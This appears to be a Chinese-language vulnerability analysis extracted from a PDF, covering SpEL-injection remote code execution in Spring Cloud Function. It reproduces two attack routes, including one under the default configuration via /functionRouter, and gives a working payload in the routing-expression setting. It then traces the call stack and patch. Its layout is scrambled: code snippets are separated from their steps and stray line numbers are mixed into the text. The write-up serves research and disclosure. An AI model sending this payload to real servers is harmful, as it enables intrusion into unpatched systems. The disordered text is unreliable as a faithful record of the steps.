0x01 应用简介
Spring Cloud Function 是 SpringBoot 开发的一个 Servless 中间件（FAAS），支持基于 SpEL 的函数
式动态路由。  
0x02 漏洞复现
测试版本：  
测试环境：
第 1 种利用：需要修改配置 + 任意路由
这种利用方式来自 逐日实验室 @默安  
1. 修改配置文件，添加 "spring.cloud.function.definition:functionRouter"  
2. 任意路由  
# v3.2.0
https://github.com/spring-cloud/spring-cloud-function/releases/tag/v3.2.0
1
2
spring-cloud-function-samples/function-sample-pojo
1
application.properties
1
3. 构造 SpEL 注入 payload  
4. 测试效果
但是
为了尽可能扩大漏洞的利用价值，能在默认配置下进行利用无疑是我们的首选，于是去啃了会儿官方文
档和相关社区，然后发现一种可在默认配置下进行 RCE 的姿势（暂不确定影响范围）。  
已测试版本
第 2 种利用：默认配置 + 特定路由
1. 保持默认配置
2. 特定路由
/aaaa
1
spring.cloud.function.routing-expression: 
T(java.lang.Runtime).getRuntime().exec("calc")
1
v3.2.0、v3.1.6、v3.0.9
1
application.properties
1
/functionRouter
1
3. 构造 SpEL 注入 payload  
4. 测试效果
ps: 为了确保准确性，在该环境测试任意路径
0x03 漏洞分析
补丁分析  
spring.cloud.function.routing-
expression: T(java.lang.Runtime).getRuntime().exec("calc")
1
由于第1种已经有人分析了
这里只分析第2种场景：默认配置+特定路由
1
2
org.springframework.cloud.function.context.config.RoutingFunction  
在此处下断点后获取到调用栈
然后往下跟踪 & 向上回溯
https://github.com/spring-cloud/spring-cloud-
function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52
1
org.springframework.cloud.function.context.config.RoutingFunction#route
1
route:125, RoutingFunction 
(org.springframework.cloud.function.context.config)
apply:85, RoutingFunction 
(org.springframework.cloud.function.context.config)
doApply:698, SimpleFunctionRegistry$FunctionInvocationWrapper 
(org.springframework.cloud.function.context.catalog)
apply:550, SimpleFunctionRegistry$FunctionInvocationWrapper 
(org.springframework.cloud.function.context.catalog)
processRequest:100, FunctionWebRequestProcessingHelper 
(org.springframework.cloud.function.web.util)
post:74, FunctionController (org.springframework.cloud.function.web.flux)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
lambda$invoke$0:144, InvocableHandlerMethod 
(org.springframework.web.reactive.result.method)
apply:-1, 1875846925 
(org.springframework.web.reactive.result.method.InvocableHandlerMethod$$Lamb
da$714)
onNext:125, MonoFlatMap$FlatMapMain (reactor.core.publisher)
complete:1816, Operators$MonoSubscriber (reactor.core.publisher)
signal:251, MonoZip$ZipCoordinator (reactor.core.publisher)
onNext:336, MonoZip$ZipInner (reactor.core.publisher)
onNext:180, MonoPeekTerminal$MonoTerminalPeekSubscriber 
(reactor.core.publisher)
onNext:101, FluxDefaultIfEmpty$DefaultIfEmptySubscriber 
(reactor.core.publisher)
onNext:79, FluxOnErrorResume$ResumeSubscriber (reactor.core.publisher)
onNext:127, FluxMapFuseable$MapFuseableSubscriber (reactor.core.publisher)
onNext:107, FluxContextWrite$ContextWriteSubscriber (reactor.core.publisher)
onNext:295, FluxMapFuseable$MapFuseableConditionalSubscriber 
(reactor.core.publisher)
onNext:337, FluxFilterFuseable$FilterFuseableConditionalSubscriber 
(reactor.core.publisher)
complete:1816, Operators$MonoSubscriber (reactor.core.publisher)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
往下跟踪
onComplete:159, MonoCollect$CollectSubscriber (reactor.core.publisher)
onComplete:142, FluxMap$MapSubscriber (reactor.core.publisher)
onComplete:260, FluxPeek$PeekSubscriber (reactor.core.publisher)
onComplete:142, FluxMap$MapSubscriber (reactor.core.publisher)
onInboundComplete:400, FluxReceive (reactor.netty.channel)
onInboundComplete:419, ChannelOperations (reactor.netty.channel)
onInboundNext:590, HttpServerOperations (reactor.netty.http.server)
channelRead:93, ChannelOperationsHandler (reactor.netty.channel)
invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)
channelRead:264, HttpTrafficHandler (reactor.netty.http.server)
invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:436, 
CombinedChannelDuplexHandler$DelegatingChannelHandlerContext 
(io.netty.channel)
fireChannelRead:324, ByteToMessageDecoder (io.netty.handler.codec)
fireChannelRead:311, ByteToMessageDecoder (io.netty.handler.codec)
callDecode:432, ByteToMessageDecoder (io.netty.handler.codec)
channelRead:276, ByteToMessageDecoder (io.netty.handler.codec)
channelRead:251, CombinedChannelDuplexHandler (io.netty.channel)
invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)
channelRead:1410, DefaultChannelPipeline$HeadContext (io.netty.channel)
invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:919, DefaultChannelPipeline (io.netty.channel)
read:166, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)
processSelectedKey:719, NioEventLoop (io.netty.channel.nio)
processSelectedKeysOptimized:655, NioEventLoop (io.netty.channel.nio)
processSelectedKeys:581, NioEventLoop (io.netty.channel.nio)
run:493, NioEventLoop (io.netty.channel.nio)
run:986, SingleThreadEventExecutor$4 (io.netty.util.concurrent)
run:74, ThreadExecutorMap$2 (io.netty.util.internal)
run:30, FastThreadLocalRunnable (io.netty.util.concurrent)
run:745, Thread (java.lang)
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
org.springframework.cloud.function.context.config.RoutingFunction#route
1
跟进
发现熟悉的身影 expression.getValue()
向上回溯
发现关键字 "functionRouter", 不管是第 1 种还是第 2 种利用姿势，都与 functionRouter 有着莫名的联
系。
...(省略部分调用栈分析)
继续看源码看文档得知，可以通过目录获取对应功能接口的实例  
org.springframework.cloud.function.context.config.RoutingFunction#functionFro
mExpression
1
org.springframework.cloud.function.context.config.RoutingFunction#FUNCTION_NA
ME
1
跟进
跟进  
跟进
/functionRouter
1
org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelpe
r#findFunction
1
org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelpe
r#doFindFunction
1
org.springframework.cloud.function.context.FunctionCatalog#lookup(java.lang.S
tring, java.lang.String...)
org.springframework.cloud.function.context.catalog.BeanFactoryAwareFunctionRe
gistry#lookup
org.springframework.cloud.function.context.catalog.SimpleFunctionRegistry#doL
ookup
1
2
3
至此已经获取到对应实例，经过一些处理后，执行到  
是不是些许熟悉？
跟进  
跟进  
org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelpe
r#processRequest
1
org.springframework.cloud.function.context.config.RoutingFunction#apply
1
经过以下判断后  
触发断点，整个漏洞利用的链路被成功串连。  
具体影响范围不详，已测试版本如下  
org.springframework.cloud.function.context.config.RoutingFunction#route
1
# false
if (this.routingCallback != null) {...} 
# false
if (StringUtils.hasText((String) 
message.getHeaders().get("spring.cloud.function.definition"))) {...}
# true
else if (StringUtils.hasText((String) 
message.getHeaders().get("spring.cloud.function.routing-expression"))) {...}
1
2
3
4
5
6
v3.0.9
1
参考资料：  
v3.1.6
1
v3.2.0
1
https://mp.weixin.qq.com/s/ssHcLC72wZqzt-ei_ZoLwg
1